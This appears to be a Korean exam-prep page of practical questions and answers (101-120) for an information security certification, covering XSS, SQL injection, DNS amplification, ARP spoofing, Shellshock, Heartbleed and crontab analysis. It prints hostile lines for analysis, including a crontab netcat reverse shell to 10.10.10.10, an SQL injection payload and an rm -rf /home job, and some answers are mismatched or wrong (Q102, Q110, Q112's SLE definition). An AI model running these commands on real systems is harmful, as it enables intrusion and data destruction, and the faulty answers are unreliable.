---
title: "[정보보안기사] 서술형6"
category: exam
date: 2026-04-20 00:00:00 +0900
tags: [exam, security, exam, practical]
---

## <span class="question-number">101번</span>
**문제**
특정 웹 페이지에 실행 가능한 스크립트를 삽입하여 페이지 방문자의 개인정보나 쿠키정보를 탈취하여 전송하는 공격 및 동작 원리, 이를 공격을 보안하기 위한 방안을 서술하시오.

**답**
1) XSS 공격 정의 : 웹페이지에 악의적인 스크립트를 포함시켜 사용자 측에서 실행되도록 유도함으로써 이득을 취하는 공격

2) XSS 공격 기법 2 가지 2-1) Reflected XSS :  검색 결과, 에러 메시지 등을 통해 서버가 외부에서 입력 받은 악성 스크립트가 포함된 URL 파라미터 값을 사용자 브라우저에서 응답하도록 허용할 때 발생한다. 공격 스크립트가 삽입된 URL 을 사용자가 쉽게 확인할 수 없도록 변형하여, 이메일, 메신저, 파일 등을 통해 실행을 유도하는 기법이다. 2-2) Stored XSS : 웹 사이트의 게시판, 코멘트 필드, 사용자 프로필 등의 입력 Form 을 통해 악성 스크립트를 삽입하여 DB 저장한다. 이후 사용자가 사이트를 방문하여 저장된 페이지(예:게시글)를 열람할 때, 저장된 악성 스크립트가 로딩되어 사용자 브라우저에서 실행되도록 하는 기법이다. 2-3) DOM based XSS : 외부에서 입력 받은 악성 스크립트가 포함된 URL 파라미터 값이 서버를 거치지 않고, DOM 생성의 일부로 실행되면서 공격이 이루어진다.

3) XSS 대응방안 3-1) 웹 서버에서 입력 값에 정의된 문자 길이를 제한 또는 검증하여 클라이언트 측에서 실행될 수 있는 스크립트 명령이 삽입되지 않도록 설정한다. 3-2) HTML 태그의 사용이 불필요한 경우 사용자의 입력 값에서 HTML 특수 문자들을 HTML Entity 로 변환하여 스크립트를 일반 문자열로 인식되도록 한다. 3-3) 부득이하게 HTML 태그를 반드시 사용해야 할 경우에는 블랙리스트 또는 화이트리스트 방식을 이용해 반드시 사용해야만 하는 특정 태그만 사용할 수 있도록 설정한다. 3-4) 웹 방화벽(WAF, Web Application Firewall) 를 사용하여 비정상적인 데이터가 전송될 경우 차단한다.

## <span class="question-number">102번</span>
**문제**
특정 웹 페이지에 실행 가능한 스크립트를 삽입하여 페이지 방문자의 개인정보나 쿠키정보를 탈취하여 전송하는 공격 및 동작 원리, 이를 공격을 보안하기 위한 방안을 서술하시오.

**답**
- a.bat, msnsrv.exe, wassa.exe 파일 생성

- 시스템 기동 시 자동 실행되도록 레지스트리 값 추가

- 탐색기의 Hidden 속성의 파일 보이기 속성 해제

- 커맨드 셀 cmd.exe 를 레지스트리에서 삭제

- 커맨드 셀 실행 시에 msnsrv.exe 가 실행되도록 레지스트리 추가

- 윈도우 방화벽에서 TCP 포트 9070 을 허용

## <span class="question-number">103번</span>
**문제**
위험분석모델 중 복합적 모델 접근방법의 장단점을 기술하시오.

**답**
- 장점: 비용과 자원을 효율적으로 사용할 수 있음. 고위험 영역을 빠르게 식별 가능

- 단점: 고위험 영역에 잘못 식별되었을 경우, 위험분석 비용이 낭비되거나 부적절하게 대응될 수 있음

## <span class="question-number">104번</span>
**문제**
다음 결과에 대해 답하시오.

(1) 어떤 유형의 공격인가?

(2) 공격대상은 무엇인가?

(3) HTTP 상태코드 값이 200 으로 출력되었다. 공격은 성공했는지 여부와 성공의 판단 근거를 서술하시오.

**답**
(1) 디렉터리 리스팅

(2) 웹 서버 (192.168.0.10)

(3) 공격은 성공으로 판단됨. HTTP 200 OK 응답 코드를 통해 정상적으로 브라우저에 디렉터리 리스팅 정보가 출력된 것을 알 수 있다.

## <span class="question-number">105번</span>
**문제**
다음은 DNS 서버로 zone-transfer 를 시도한 결과이다. 각 질문에 답하시오. #dig @NS1.abc.COM def.com axfr

; <<>> DIG 9.2.1 <<>> @NS1.abc.COM def.com axfr ; global options: print cmd Transfer failed

#dig @NS2.abc.COM def.com axfr

xxxx.com. 1800 IN SOA ns1.xxxx.com hostmaster.ns1.abc.com xxxx.com 1800 IN MX 5 mail4.xxxx.com, xxxx.com 1800 IN MX 5 mail5.xxxx.com xxxx.com 1800 IN A 211.xx.xx.xx

(1) 1 차 네임서버의 zone-transfer 의 상태를 설명하시오.

(2) 2 차 네임서버는 이렇게도 다양한 정보를 보여주고 있다. zone -transfer 관련 보안 위험요소는 무엇이 있는 지 설명하시오.

(3) zone-transfer 보안 위험성 대응책은 무엇인지 기술하시오.

**답**
(1) 1 차 네임서버는 zone-transfer 응답을 하고 있지 않아 정보를 알아내는 데 실패

(2) 공격자는 간단한 방법으로 내부의 시스템/네트워크 구조를 쉽게 파악할 수 있다. • 사내 IP 대역이나 보안장비 IP 도 노출 • zone-transfer 시도에 zone 파일 크기에 따라 과도한 트래픽을 유발할 수 있어 서비스 거부로 악용될 수 있다.

(3) zone transfer 가 필요 없을 경우 비활성 시킴

## <span class="question-number">106번</span>
**문제**
IPSec 의 기능을 4 가지 이상 기술하시오.

**답**
(1) 데이터 기밀성: ESP 프로토콜의 payload 암호화를 통해 메시지가 제 3 자에 의해 도청되어도 그 내용이 노출되지 않음을 보장

(2) 비연결성 무결성: AH 정보를 통해 비연결형 통신 데이터의 무결성 보장

(3) 데이터 근원지 인증: 송신자와 수신자만 공유한 키를 통해 메시지 발송자가 송신자인지 식별 및 인증 가능

(4) 재생공격보호: IPSec 헤더의 Sequence Number 필드를 통해 재생 공격 방어

(5) 제한된 트래픽 흐름의 비밀성: 원본 IP 헤더 값을 암호화 시키는 경우 출발지/목적지 주소 은닉 가능

## <span class="question-number">107번</span>
**문제**
웹 서버에서 다음과 같은 SQL SELECT 문이 수행된다고 할 때 아래의 항목에 대해서 설명하시오. SELECT password FROM user WHERE username='qfrankr'

(1) 쿼리의 결과는 무엇인가?

(2) 모든 사용자의 정보를 획득하기 위해 'qfrankr' 부분에 들어갈 예시를 작성하시오.

(3) 위 예시가 가능한 이유는 무엇인가?

**답**
(1) qfrankr 사용자에 대한 패스워드 정보를 확인한다.

(2) ' or 'a'='a 또는 ' or '1'='1 등 조건절을 참으로 만드는 다양한 조건값이 가능.\

(3) 조건절이 WHERE username='' or '1'='1'이 되므로 항상 결과가 참이 된다.

## <span class="question-number">108번</span>
**문제**
DNS 증폭 공격(DNS Amplification DDoS Attack) 중 IP 기반 공격에 대해 설명하고 IP 기반 공격을 사용하는 이유와 사용하는 레코드 type 을 기술하시오.

**답**
- IP 기반 DNS 증폭 공격기법: IP Spoofing 을 사용하여 출발지(Source) IP 를 공격하고자 하는 희생자(victim)서버의 IP 로 위조한 후 다수의 DNS 질의를 수행한다

- 증폭 이유: 공격자의 DNS 질의에 대한 응답 패킷을 IP Spoofing 된 희생자 서버가 수신하게 되므로 서비스거부 공격 가능

- DNS 질의 타입: ANY 타입 or TXT 레코드 타입

- 해당 레코드 타입 사용 이유: any 또는 txt type 의 경우 요청하는 패킷의 크기와 응답 패킷 크기가 비대칭적으로 응답 패킷 사이즈가 크게 때문에 작은 컴퓨팅 리소스로 효율적인 공격이 가능

## <span class="question-number">109번</span>
**문제**
다음은 공격상황의 패킷을 캡처한 결과이다. 그림을 보고 다음 물음에 답하시오.

(1) 어떤 공격인가?

(2) 어떤 현상이 발생하며, 그 이유는 무엇인가?

(3) 대응 방법은 무엇인가?

**답**
(1) Slow HTTP Header DoS(Slowloris) 공격

(2) 서비스가 느려지고 새로운 정상 접속요청이 거부된다.

- 요청 헤더 부분을 비정상적으로 조작, 불필요한 헤더정보를 천천히 지속적으로 전달하여 웹서버가 헤더 정보를 완전히 수신할 때까지 연결을 장시간 유지한다.

- 웹서버가 동시에 연결상태(HTTP 연결상태)를 유지할 수 있는 자원은 제한적이며, 다수의 연결상태가 비정상적으로 지속되면 정상적인 사용자의 서비스 접속이 어려워진다.

(3) 공격자가 동시에 많은 연결상태(세션)를 유지하므로 이를 차단하기 위해 서버방화벽 등을 이용하여 동시 연결에 대한 임계치 제한을 설정한다.

## <span class="question-number">110번</span>
**문제**
게이트웨이의 IP 주소가 172.111.11.10 이고 MAC 주소가 11-22-33-44-55-66 인 환경에서 다음 커맨드에 출력된 내용을 참고하여 어떤 유형의 공격인지 판단하고 판단 근거 및 대응방안을 서술하시오.

172.111.11.1 11-22-33-44-55-66 Dynamic

172.111.11.2 ab-bc-cd-de-ef-ff Dynamic

172.111.11.3 11-22-33-44-55-66 Dynamic

172.111.22.2 xx-yy-zz-11-22-33 Dynamic

**답**
(1) 공격유형: ARP Spoofing

(2) 판단근거: 172.111.11.30 / 172.111.11.1 과 같은 MAC 주소를 가지고 있다.

(3) 대응방안

- ARP Cache Table 정보를 정적(static)으로 설정하여 ARP 프로토콜을 통한 변조가 발생하지 않도록 함

- ARP -s [게이트웨이 IP] [게이트웨이 MAC 주소]

## <span class="question-number">111번</span>
**문제**
다음 문제에서 요구하는 사항에 답하시오 (A) 스머프 공격의 원리를 설명하고, (B) 방화벽이나 IDS 없이 막을 수 있는 방법을 기술하라.

**답**
(A) 공격 대상 호스트로 위조한 ICMP 패킷을 브로드캐스트하면 근처의 호스트가 다량의 Echo Reply 를 발생시킨다.

(B) 라우터 외부에서 들어오는 IP directed Broadcast 패킷 차단, host= ip broadcast 로 전송된 ICMP 패킷 응답하지 않도록 설정

## <span class="question-number">112번</span>
**문제**
다음은 위험분석에 대한 설명이다. 요구하는 각 항목에 답하시오.

(1) SLE 이란 무엇인가?

(2) SLE 를 구하는 식을 적으시오.

(3) ALE 를 구할 때 SLE 를 제외하고 필요한 것은 무엇인가?

(4) 위험을 완전히 제거하는 연간비용이 X 라고 할 때 ROI 는?

**답**
(1) 연간손실액

(2) SLE = AV(자산가치) * EF(자산의 손실액)

(3) ARO(연간발생률)

(4) ALE-X=ROI (보안투자비용은 ALE 보다 작아야 한다.)

## <span class="question-number">113번</span>
**문제**
개인정보 보호법에 따라 개인정보처리자는 개인정보가 분실ㆍ도난ㆍ유출(이하 이 조에서 “유출 등”이라 한다)되었음을 알게 되었을 때에는 지체 없이 해당 정보주체에게 다음 각 호의 사항을 알려야 한다. 이때 알려야 할 사항 5 가지를 기술하시오.

**답**
(1) 유출 등이 된 개인정보의 항목

(2) 유출 등이 된 시점과 그 경위

(3) 유출 등으로 인하여 발생할 수 있는 피해를 최소화하기 위하여 정보주체가 할 수 있는 방법 등에 관한 정보

(4) 개인정보처리자의 대응조치 및 피해 구제절차

(5) 정보주체에게 피해가 발생한 경우 신고 등을 접수할 수 있는 담당부서 및 연락

## <span class="question-number">114번</span>
**문제**
crontab 스케줄러 내용 분석하라. 0 * * * * /bin/cp /tmp/passwd1 /etc/passwd 0 0 12 * * root /usr/bin/nc 10.10.10.10 80 -e /bin/bash

**답**
- 임의로 조작된 passwd1 파일이 원래 passwd 파일을 덮어쓴다.

- 10.10.10.10 호스트에 80 포트로 연결한다. 리버스쉘의 위험이 있다.

## <span class="question-number">115번</span>
**문제**
```text
Source PORT: 443, Destination PORT: 80 일 때 아래 HTTP Request 분석하라.
GET /login.php HTTP/1.1
Host: test.com
```

Connection: keep-alive Cookie: sEsz4sH5bChIslfOeJgjXdi== Pragma: no-cache Cache-Control: must-revalidate Content-length: 32

id=admin&password=1234&act=login

**답**
```text
Cache-control 에서 must-revalidate 설정으로 캐시서버를 사용하고 있지 않아 부하를
```

일으킬 가능성이 있다. • 전달 파라미터로 넘긴 내용에 id 와 password 등의 내용은 스니핑, 도청의 민감한 정보 유출에 위험이 있다. • 쿠키 값을 노출시키고 있다. • 443 포트 접속을 80 포트로 접속하고 있다.

## <span class="question-number">116번</span>
**문제**
다음 지문을 보고 질문에 답하시오. OpenSSL 의 보안결함을 발견하고 이를 이슈화 하기 위하여 HeartBleed 이름을 붙였다. 그 이후에 본문에 나타난 심각한 취약점의 미국 국립표준기술연구소(NIST)는 하트블리드 취약점보다 높은 최고 점수 10 점을 선정하여 발표하였고 (A)라는 이름을 붙였다. $ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

(1) (A)의 이름을 쓰시오.

(2) A 취약점의 발생 이유를 설명하시오.

(3) 위 로그를 보고 어떠한 행위를 하고 있는지 설명하시오.

**답**
(1) ShellShock (쉘 쇼크)

(2) Bash 셸이 제공하는 함수 선언기능에서 취약점이 발견

(3) 공격자가 서버에 포트를 열어놓고 피해자의 서버에 명령어를 전달하여 접속하도록 유도하는 리버스 쉘 연결한다.

## <span class="question-number">117번</span>
**문제**
다음 보기는 웹 공격에 대한 설명이다. 주어진 질문에 서술하시오. 파일 업로드 취약점을 파일을 첨부할 수 있는 게시판에 일반적으로 허용된(이미지 파일, 워드 파일) 이외의 악의적인 스크립트가 포함된 소스파일로 필터링 없이 첨부할 수 있게 되면 악의적인 공격자는 악성 스크립트를 이용한 서버에서 쉘을 획득하여 명령어를 실행할 수 있게 된다.

(1) 위 업로드의 취약점의 발생 원인은 무엇인가?

(2) 대응방안을 설명하시오.

**답**
(1) 악성스크립트가 첨부된 파일을 게시판에 업로드에 성공되면 업로드 공격에 취약

(2) 업로드 파일명 확장자 필터링 정책 / 업로드 파일 저장 디렉터리 따로 생성 서버 실행권한 제거

## <span class="question-number">118번</span>
**문제**
보안관제 업무시 사고발생 후 시행되는 디지털포렌식의 기본 원칙 중 연계 보관성의 원칙을 서술하고 각 단계를 설명하시오.

**답**
- 증거물의 수집, 이동, 보관, 분석, 법정 제출의 각 단계에서 담당자 및 책임자가 명확해야 함.

- 증거 채택 후 이송/분석/보관/법정 제출이라는 일련의 과정이 명확해야 하며 추적가능 해야 함.

## <span class="question-number">119번</span>
**문제**
다음 보기를 보고 주어진 질문에 알맞은 내용을 서술하시오. 통신 구간 암호화를 위해 많이 사용하는 OpenSSL 라이브러리에서 서버에 저장된 중요 메모리 데이터가 노출되는 (A) 보고서 명명된 심각한 버그가 발견되어 시스템 및 소프트웨어에 대한 신속한 취약점 조치를 권고한다.

(1) 취약점명은 무엇인가?

(2) 영향을 받는 버전은 무엇인가?

(3) 대응방법은 무엇인가?

**답**
(1) OpenSSL Heartbleed 취약점

(2) OpenSSL 1.0.1 ~ OpenSSL 1.0.1f, OpenSSL 1.0.2.beta ~ OpenSSL 1.0.2-beta1

(3) 최신버전 UPDATE

## <span class="question-number">120번</span>
**문제**
다음은 Crontab 에 대한 설명이다. 주어진 질문에 알맞은 답을 서술하시오. Crontab 은 리눅스에서 스케줄링하여 원하는 시간에 작업을 수행할 수 있는 유용한 유틸리티이다. 각 사용자별로 crontab 파일을 가지게 되며 cron job scheduler 가 지정된 시간에 주기적으로 지정된 파일을 실행해 준다.

(1) Cron 으로 현재 작업되어 있는 내용을 보는 명령어는?

(2) SIS 계정의 crontab 을 편집하는 방법은 무엇인가?

(3) 매주 일요일 새벽 3 시에 rm -rf 명령어를 이용하여 /home 디렉터리 하위 모든 파일과 디렉터리를 삭제하는 작업을 등록하라.

**답**
(1) crontab -l

(2) crontab -u sis -e

(3) 0 3 * * 0 rm -rf /home/ 1> /dev/null 2> &1*
